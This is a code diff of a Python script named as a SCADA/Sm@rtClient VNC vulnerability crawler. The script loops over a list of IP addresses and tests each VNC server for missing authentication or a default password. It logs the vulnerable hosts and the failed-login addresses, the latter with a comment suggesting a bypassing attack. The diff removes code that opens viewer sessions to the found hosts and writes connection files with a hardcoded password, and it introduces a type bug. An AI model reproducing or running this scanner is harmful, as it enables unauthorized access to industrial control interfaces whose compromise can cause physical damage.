@@ -3,7 +3,7 @@
 print ("""
 #############################################################|
 #------------------------------------------------------------|
-#  SCADA/Sm@rtClient Auto VNC Vulnerability Crawler V.1.4.4  |
+#   SCADA/Sm@rtClient Auto VNC Vulnerability Crawler V.1.4   |
 #------------------------------------------------------------|
 #############################################################|
 """)
@@ -21,9 +21,7 @@ print ("""
 #############################################
 #############################################
 #
-#
-import subprocess
-import os
+# 
 import time
 from time import clock
 import pprint
@@ -286,13 +284,6 @@ if __name__ == '__main__':
 # status 3 = bad configuration (wrong version, wrong security type)
 # status 4 = bad connection
 # status 5 = too many failures
-
-def vncviewer():
-        print i
-        subprocess.Popen(("SmartClient.exe " + str(i) + "::5900 -password 100"), stdout=subprocess.PIPE, shell=True)
-        #p1
-        #os.system("SmartClient.exe " + str(i) + "::5900 -password 100")
-
 startingtime=clock()
 def testvnc(server, port, password, timeout, verbose):
 	try:
@@ -542,45 +533,6 @@ def calc_key(password):
 
 	return flipped_key
 
-def sacfiles():
-        sacfiletype=open((i)+".sac", "w")
-	sacfiletype.write("""[connection]
-host=""" + (i) +"""
-port=5900
-password=7361719c6efd7676000000000000000000000000000000000000000000000000
-[options]
-use_encoding_0=1
-use_encoding_1=1
-use_encoding_2=1
-use_encoding_3=0
-use_encoding_4=1
-use_encoding_5=1
-use_encoding_6=1
-use_encoding_7=1
-use_encoding_8=1
-preferred_encoding=7
-restricted=0
-viewonly=0
-fullscreen=0
-8bit=0
-UseCursorKeyScroll=0
-SuppressDeviceLayout=0
-shared=1
-swapmouse=0
-belldeiconify=0
-emulate3=0
-emulate3timeout=100
-emulate3fuzz=4
-disableclipboard=0
-localcursor=1
-fitwindow=0
-scale_den=1
-scale_num=1
-cursorshape=1
-noremotecursor=0
-compresslevel=-1
-quality=6
-""")
 
 #def usage():
 #	print "usage: %s SERVER PORT PASSWORD [TIMEOUT [VERBOSE]]" % sys.argv[0]
@@ -591,7 +543,6 @@ if __name__ == '__main__':
 #		usage()
 #	else:
 
-                vncvieweryn=raw_input("Do you want to open servers with vncviewer [it can be slow down your PC] (y/n): ")
 		p=raw_input("page number: ")
 		l=[]
 		with open("results.txt", "r") as file:
@@ -600,7 +551,7 @@ if __name__ == '__main__':
 		t=0
 		listnew=[]
 		listauthfails=[]
-		s=(int(p)*20)
+		s=(p*20)
 		while t<s:
 			for i in l:
 				server = (i)
@@ -623,21 +574,9 @@ if __name__ == '__main__':
 				if status == 0:	
 					print "\"None\" authentication method detected"
 					listnew.append(i)
-					sacfiles()
-                                        if vncvieweryn=="y" or vncvieweryn=="Y":
-                                                print ("[*]vncviewer is starting...")
-						vncviewer()
-					else:
-						print ("[*]vncviewer is not starting")
 				elif status == 1:
 					print "Authentication successful"
 					listnew.append(i)
-					sacfiles()
-                                        if vncvieweryn=="y" or vncvieweryn=="Y":
-						print ("[*]vncviewer is starting...")
-						vncviewer()
-					else:
-						print ("[*]vncviewer is not starting")
 				elif status == 2:
 				#you can use bypassing attack with those failed IP addresses
 					print "Authentication failed"
@@ -654,16 +593,11 @@ if __name__ == '__main__':
 				print (gecenzaman)
 				resclients=open("vulnerables.txt", "w")
 				resclients.write(pprint.pformat(listnew) + '\n')
-				resclients.close()
-				
+
+				resclients.close() 
 				authfailones=open("AuthFailedIPs.txt", "w")
 				authfailones.write(pprint.pformat(listauthfails) + '\n')
 				authfailones.close
+
+
 				t=t+1
-                                print str(t) + " of the IP addresses have been tried."
-                                print s
-                                if int(t)==int(s):
-                                        print "The task has been finished because number of process reached the stated page number."
-                                        exit()
-                                else:
-                                        pass
